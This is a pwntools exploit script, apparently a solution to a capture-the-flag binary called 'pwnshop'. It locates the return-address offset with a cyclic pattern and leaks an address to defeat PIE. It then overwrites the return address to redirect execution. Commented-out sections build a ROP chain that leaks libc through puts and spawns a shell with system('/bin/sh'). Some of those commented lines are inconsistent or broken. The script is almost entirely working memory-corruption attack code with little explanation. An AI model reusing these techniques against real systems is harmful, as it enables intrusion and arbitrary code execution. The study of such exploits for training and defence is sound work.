from pwn import *


# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


def find_ip(payload):
    # Launch process and send payload
    p = process(exe)
    p.sendlineafter('>', '1')  # Try to buy something
    p.sendlineafter('Enter details:', payload)
    # Wait for the process to crash
    p.wait()
    # Print out the address of EIP/RIP at the time of crashing
    # ip_offset = cyclic_find(p.corefile.pc)  # x86
    ip_offset = cyclic_find(p.corefile.read(p.corefile.sp, 4))  # x64
    info('located EIP/RIP offset at {a}'.format(a=ip_offset))
    return ip_offset


# Specify your GDB script here for debugging
gdbscript = '''
init-pwndbg
piebase 0x132a
continue
'''.format(**locals())
# piebase 0x40c0 # .bss section
# breakrva 0x1352 # read call (before BoF)


# Set up pwntools for the correct architecture
exe = './pwnshop'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Enable verbose logging so we can see exactly what is being sent (info/debug)
context.log_level = 'debug'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

# Pass in pattern_size, get back EIP/RIP offset
offset = find_ip(cyclic(100))

# Start program
io = start()

libc = ELF('libc6_2.23-0ubuntu11.2_amd64.so')

rop = ROP(elf)

# Useful gadget / address offsets
pop_rdi = rop.find_gadget(['pop rdi', 'ret', ])[0] #0x13c3  # pop rdi; ret;
sub_rsp_28 = 0x1219  # sub rsp, 0x28; ret;

# Leak address
io.sendlineafter('>', '2')  # Try to sell something
io.sendlineafter('What do you wish to sell?', '420')  # Doesn't matter
io.sendlineafter('How much do you want for it?', 'A' * 7)  # Leak address
io.recvuntil('A\n')
leaked_addr = unpack(io.recv()[:6].ljust(8, b"\x00"))
info("leaked_address: %#x", leaked_addr)

# Calculate the PIE base (GDB) and update ELF
elf.address = leaked_addr - 0x40C0  # 0x40c0 (.bss - &DAT_001040c0)
info("pie_base: %#x", elf.address)

# Can we just control the RIP and go to the sell function?
sell_addr = elf.address + 0x126a
# Build the payload
payload = flat(
    {offset: sell_addr}
)

io.sendline('1')  # Try to buy something
io.sendafter('Enter details:', payload)

io.interactive()

# rop.raw([
#     elf.address + pop_rdi,
#     elf.got.puts,
#     elf.plt.puts,
#     elf.address + 0x132a
#     ])

# # Calculate padding
# padding = (offset - len(rop.chain()))
# # Payload to increase stack space and leak libc foothold
# payload = flat({padding: [rop.chain(), elf.address + sub_rsp_28]})

# io.sendline('1')  # Try to buy something
# #io.sendlineafter('Enter details:', payload)
# io.sendafter('Enter details:', payload)

# # Get our leaked puts address
# got_puts = unpack(io.recvline().strip()[:6].ljust(8, b"\x00"))
# info("got_puts: %#x", got_puts)

# # Calculate libc base
# libc.address = got_puts - libc.symbols.puts #0x765f0
# info("libc_base: %#x", libc.address)

# # # Calculate system offset
# # system_addr = libc.symbols.system #libc_base + 0x0453a0# 0x48e50
# # info("system_addr: %#x", system_addr)
# # # Calculate "/bin/sh" offset
# # bin_sh = next(libc.search(b'/bin/sh\x00')) #libc_base + 0x18ce17 #0x18a156
# # info("bin_sh: %#x", bin_sh)

# rop = ROP(libc)
# rop = ROP(libc.search(b'/bin/sh\x00'))
# rop.raw([elf.address + 0x132a])


# # # Build up rop chain to get shell
# # rop_chain = flat([
# #     elf.address + pop_rdi,  # Pop "/bin/sh" to RDI
# #     bin_sh,
# #     system_addr,  # Call system
# #     elf.address + 0x132a  # Return to "Buy" (1)
# # ])  # Max 32 bytes

# # Calculate padding
# padding = (offset - len(rop))

# # Payload to spawn shell
# payload = flat({
#     padding: [
#         rop.chain(),  # System("/bin/sh")
#         elf.address + sub_rsp_28  # Go back 28 bytes (to rop_chain)
#     ]
# })

# #io.sendline('1')  # Try to buy something
# io.sendlineafter('Enter details:', payload)

# # Got Shell?
# io.interactive()
